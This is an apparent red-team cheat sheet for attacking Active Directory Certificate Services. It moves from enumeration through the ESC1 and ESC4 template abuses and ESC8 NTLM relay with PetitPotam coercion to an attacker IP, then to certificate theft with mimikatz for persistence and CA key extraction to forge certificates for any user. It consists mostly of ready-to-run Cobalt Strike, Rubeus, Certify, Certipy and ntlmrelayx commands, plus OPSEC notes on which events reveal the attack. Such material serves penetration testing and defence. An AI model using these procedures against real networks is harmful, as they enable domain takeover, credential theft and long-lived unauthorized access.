## ADCS Abuse

TODO add in the rest: 
https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques

Abusing Active Directory Certificate Services for privilege escalation, lateral movement, and persistence.

> [!Important]
> Certificates are powerful because they survive password changes and have long validity periods (1+ years for user certs, 5-10+ years for CA keys). They are only invalidated by revocation or expiry — not by password resets.

---

### Terminology

**Enterprise CA** — Certificate Authority integrated with AD (as opposed to standalone). Offers certificate templates.

**Certificate Template** — Collection of settings and policies defining what a certificate issued by an Enterprise CA contains.

**CSR (Certificate Signing Request)** — Message sent to a CA to request a signed certificate.

**EKU (Extended/Enhanced Key Usage)** — Defines what the certificate can be used for (OIDs). Client/Server auth, code signing, email signing, etc. No defined EKUs = usable for all purposes.

**SAN (Subject Alternative Name)** — Who/what the certificate can represent. ENROLLEE_SUPPLIES_SUBJECT lets the requestor specify any SAN.

Reference: [SpecterOps — Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

---

### Enumeration

#### CS

```sh
# Find all Certificate Authorities and templates
beacon> execute-assembly C:\Tools\Certify.exe cas

# Find vulnerable templates
beacon> execute-assembly C:\Tools\Certify.exe find /vulnerable
```

#### Linux

```sh
# crackmapexec LDAP ADCS module
crackmapexec ldap <dc> -d <domain> -u <user> -p <password> -M adcs

# ntlmrelayx ADCS dump
ntlmrelayx -t "ldap://<dc>" --dump-adcs

# windapsearch
windapsearch -m custom --filter '(objectCategory=pKIEnrollmentService)' --base 'CN=Configuration,DC=<domain>,DC=<tld>' --attrs dn,dnshostname --dc <dc> -d <domain> -u <user> -p <password>

# RPC
rpc net group members "Cert Publishers" -U "<DOMAIN>"/"<user>"%"<password>" -S "<dc>"
```

#### Manual (Windows)

```sh
net group "Cert Publishers" /domain
```

---

### Misconfigured Templates (ESC1)

A template is exploitable when ALL three conditions are met:
1. `ENROLLEE_SUPPLIES_SUBJECT` is enabled (requestor can specify any SAN)
2. `Client Authentication` EKU is set (certificate can be used for Kerberos auth)
3. Domain Users (or your account) have enrollment rights

```sh
# 1. Find the template
beacon> execute-assembly C:\Tools\Certify.exe find /vulnerable

# 2. Request a certificate with an alternate name (e.g. a DA)
beacon> execute-assembly C:\Tools\Certify.exe request /ca:<dc_fqdn>\<ca_name> /template:<TemplateName> /altname:<target_user>

# 3. Copy the full output (private key + certificate) to Ubuntu WSL as cert.pem
# Convert PEM → PFX
ubuntu> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# Enter an export password when prompted

# 4. Base64 encode for Rubeus
ubuntu> cat cert.pfx | base64 -w 0

# 5. Request a TGT using the forged certificate
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<target_user> /certificate:<BASE64_PFX> /password:<pfx_password> /nowrap
```

> [!Note]
> If a principal you control has WriteOwner, WriteDacl, or WriteProperty on a template, that can also be abused.

---

### Misconfigured Template ACLs (ESC4)

If you have **WriteProperty**, **WriteDacl**, or **WriteOwner** on a certificate template, you can modify the template to make it vulnerable (add ENROLLEE_SUPPLIES_SUBJECT, Client Authentication EKU, enrollment rights) — then exploit it like ESC1.

#### CS

```sh
# 1. Find templates where you have write access
beacon> execute-assembly C:\Tools\Certify.exe find /vulnerable

# Look for templates where your user/group has:
#   WriteDacl, WriteOwner, WriteProperty, GenericAll, GenericWrite

# 2. Modify the template to be exploitable
# Option A: PowerShell (modify template attributes via ADSI)
beacon> powershell $template = [ADSI]"LDAP://CN=<TemplateName>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>"

# Enable ENROLLEE_SUPPLIES_SUBJECT
beacon> powershell $template.Put("msPKI-Certificate-Name-Flag", 1)
# Add Client Authentication EKU (1.3.6.1.5.5.7.3.2)
beacon> powershell $template.Put("pKIExtendedKeyUsage", @("1.3.6.1.5.5.7.3.2"))
beacon> powershell $template.SetInfo()

# 3. Now exploit like ESC1
beacon> execute-assembly C:\Tools\Certify.exe request /ca:<dc_fqdn>\<ca_name> /template:<TemplateName> /altname:administrator

# 4. CLEANUP — restore original template values (critical!)
beacon> powershell $template.Put("msPKI-Certificate-Name-Flag", <original_value>)
beacon> powershell $template.Put("pKIExtendedKeyUsage", @(<original_EKUs>))
beacon> powershell $template.SetInfo()
```

#### Linux

```sh
# Certipy — modify template, exploit, then restore
certipy template -u <user>@<domain> -p '<password>' -template <TemplateName> -save-old
certipy req -u <user>@<domain> -p '<password>' -ca <ca_name> -template <TemplateName> -upn administrator@<domain>

# Restore original template
certipy template -u <user>@<domain> -p '<password>' -template <TemplateName> -configuration <saved_config>.json
```

> [!Warning]
> Always save original template configuration before modifying. Failing to restore it leaves a persistent vulnerability in the environment.

---

### Web Enrollment Relay (ESC8)

The ADCS web enrollment endpoint (`/certsrv/`) supports NTLM authentication. Coerce a machine account to authenticate and relay to this endpoint to obtain a certificate for that machine.

> [!Note]
> ESC8 is the combination of NTLM relay + ADCS web enrollment. The relay target is `http://<ca>/certsrv/certfnsh.asp`. Requires web enrollment role to be installed on the CA.

#### From Linux (Direct)

```sh
# 1. Check if web enrollment is enabled
curl -s -o /dev/null -w "%{http_code}" http://<ca>/certsrv/

# 2. Start ntlmrelayx targeting ADCS
sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 3. Coerce a DC to authenticate
python3 PetitPotam.py <attacker_ip> <dc_ip>
# Or: python3 DFSCoerce.py -u <user> -p '<password>' -d <domain> <attacker_ip> <dc_ip>

# 4. ntlmrelayx outputs a base64 certificate for DC$
# 5. Use it to request a TGT
certipy auth -pfx dc01.pfx -dc-ip <dc_ip>
# Or via Rubeus on a Windows host
```

#### From CS (via PortBender Chain)

```sh
# Uses the same PortBender + rportfwd + SOCKS chain as general NTLM relaying
# See: c. Lateral Movement & Pivoting — NTLM Relaying

# 1. Set up relay infrastructure (firewall rules, rportfwd, SOCKS, PortBender)

# 2. Start ntlmrelayx via proxychains
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController --no-http-server

# 3. Coerce target
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe <dc> <capture_host>

# 4. Use captured certificate
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<DC>$ /certificate:<BASE64_CERT> /nowrap

# 5. S4U2Self for admin access
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:administrator /self /altservice:cifs/<dc_fqdn> /user:<DC>$ /ticket:<TGT> /nowrap
```

> [!Warning]
> ESC8 requires the CA to have the **Web Enrollment** role installed. If `certsrv` returns 404, this attack won't work. Check with `Certify.exe cas` — look for "Web Enrollment" in the output.

---

### NTLM Relaying to ADCS

Relay NTLM authentication to the ADCS HTTP enrollment endpoint (`certsrv/certfnsh.asp`) to obtain a certificate for a coerced machine account.

> [!Warning]
> You cannot relay NTLM authentication back to the originating machine. If the CA and DC are the same host, this attack won't work for DC certs.

```sh
# Uses the same PortBender + rportfwd + SOCKS chain as general NTLM relaying
# See: c. Lateral Movement & Pivoting — NTLM Relaying

# Start ntlmrelayx targeting ADCS HTTP endpoint
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://<adcs_host>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Coerce a target to authenticate to your capture machine
beacon> execute-assembly C:\Tools\SharpSpoolTrigger.exe <target_dc> <your_capture_host>

# ntlmrelayx will output a base64 certificate for the coerced machine
# Use the S4U2Self trick to get a usable TGS for any service on the machine
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<machine>$ /certificate:<BASE64_CERT> /nowrap
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:<admin> /self /altservice:cifs/<target> /user:<machine>$ /ticket:<TGT> /nowrap
```

---

### User Certificate Persistence

User certificates are valid for 1 year by default and survive password changes. Extract existing ones or request new ones.

#### CS

```sh
# 1. Enumerate existing certificates
beacon> execute-assembly C:\Tools\Seatbelt.exe Certificates
# Verify: IsUsedForClientAuth = True

# 2a. Export existing certificate (drops PFX to disk)
beacon> mimikatz crypto::certificates /export
# Sync via View > Downloads

# 2b. Request a new certificate
beacon> execute-assembly C:\Tools\Certify.exe request /ca:<dc_fqdn>\<ca_name> /template:User

# 3. Base64 encode the PFX
ubuntu> cat /path/to/cert.pfx | base64 -w 0

# 4. Request a TGT (add /enctype:aes256 to avoid RC4)
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<user> /certificate:<BASE64_PFX> /password:mimikatz /enctype:aes256 /nowrap
```

> [!Warning]
> Certificates remain valid even after password changes. Only CA revocation invalidates them. Default export password from mimikatz is `mimikatz`.

---

### Computer Certificate Persistence

Same as user certs, but requires elevation to export local machine store certificates.

```sh
# Export computer certificate (requires elevation)
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

# Base64 encode and request TGT for the machine account
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<MACHINE>$ /enctype:aes256 /certificate:<BASE64_PFX> /password:mimikatz /nowrap

# Or request a new machine certificate
beacon> execute-assembly C:\Tools\Certify.exe request /ca:<dc_fqdn>\<ca_name> /template:Machine /machine
```

---

### Forged Certificates (CA Key Extraction)

Gain local admin access to a CA server → extract the CA private key → forge certificates for any user or machine. Valid for the lifetime of the CA key (5-10+ years).

> [!Note]
> CA servers are often not treated with the same sensitivity as DCs. "Server admins" may have access. Think of the CA private key like the krbtgt hash.

```sh
# 1. On the CA server (as SYSTEM)
beacon> execute-assembly C:\Tools\SharpDPAPI.exe certificates /machine

# 2. Save the key and certificate as .pem, then convert to .pfx
ubuntu> openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ca.pfx

# 3. Forge a certificate for any user (user must exist in AD)
C:\Tools\ForgeCert.exe --CaCertPath .\ca.pfx --CaCertPassword <pass> --Subject "CN=User" --SubjectAltName "<target_user>@<domain>" --NewCertPath .\fake.pfx --NewCertPassword <pass>

# 4. Request a TGT with the forged certificate
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:<target_user> /domain:<domain> /enctype:aes256 /certificate:<BASE64_PFX> /password:<pass> /nowrap

# Machine certs: forge for a machine account, then use S4U2Self for any service access
C:\Tools\ForgeCert.exe --CaCertPath .\ca.pfx --CaCertPassword <pass> --Subject "CN=User" --SubjectAltName "<MACHINE>$@<domain>" --NewCertPath .\fake_machine.pfx --NewCertPassword <pass>
```

---

### Tools Reference

| Tool | Purpose |
|------|---------|
| **Certify** | Enumerate CAs, find vulnerable templates, request certificates (Windows) |
| **Certipy** | Linux-based ADCS enumeration and exploitation |
| **PetitPotam** | Coerce DC authentication via MS-EFS RPC (for relay attacks) |
| **ntlmrelayx** | NTLM relay to ADCS HTTP endpoint (`--adcs` flag) — use ADCS branch |
| **Masky** | Mass certificate harvesting via NTLM relay |
| **SharpDPAPI** | Extract CA private keys from CA machine |
| **ForgeCert** | Create forged certificates from extracted CA key |

---

> [!Note]
> **OPSEC:**
> - Certificate requests generate 4887 (issued) events
> - Forged certificates bypass normal issuance — only revocation invalidates them
> - NTLM relay to ADCS: WinDivert driver load is the main indicator
> - CA key extraction: SharpDPAPI accesses DPAPI-protected machine secrets
